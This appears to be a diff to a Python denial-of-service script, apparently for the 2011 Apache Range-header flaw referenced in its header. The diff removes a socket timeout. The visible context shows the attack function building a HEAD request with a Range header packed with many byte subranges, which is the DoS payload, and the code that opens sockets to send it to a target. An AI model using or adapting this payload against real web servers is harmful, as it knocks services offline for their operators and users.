@@ -12,7 +12,6 @@ REFERENCE   = "http://seclists.org/fulldisclosure/2011/Aug/175"
 SLEEP_TIME = 5          # time to wait for new thread slots (after max number reached)
 RECV_SIZE = 100         # receive buffer size in testing mode
 RANGE_NUMBER = 1024     # number of range subitems forming the DoS payload
-TIMEOUT = 10            # timeout for socket request
 
 def attack(target):
     port = 443 if 'https' in target else 80
@@ -30,7 +29,6 @@ def attack(target):
         packet = "HEAD %s HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (page, target, payload)
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(TIMEOUT)
             s.connect((host, int(port)))
             s.send(packet)
             if recv:
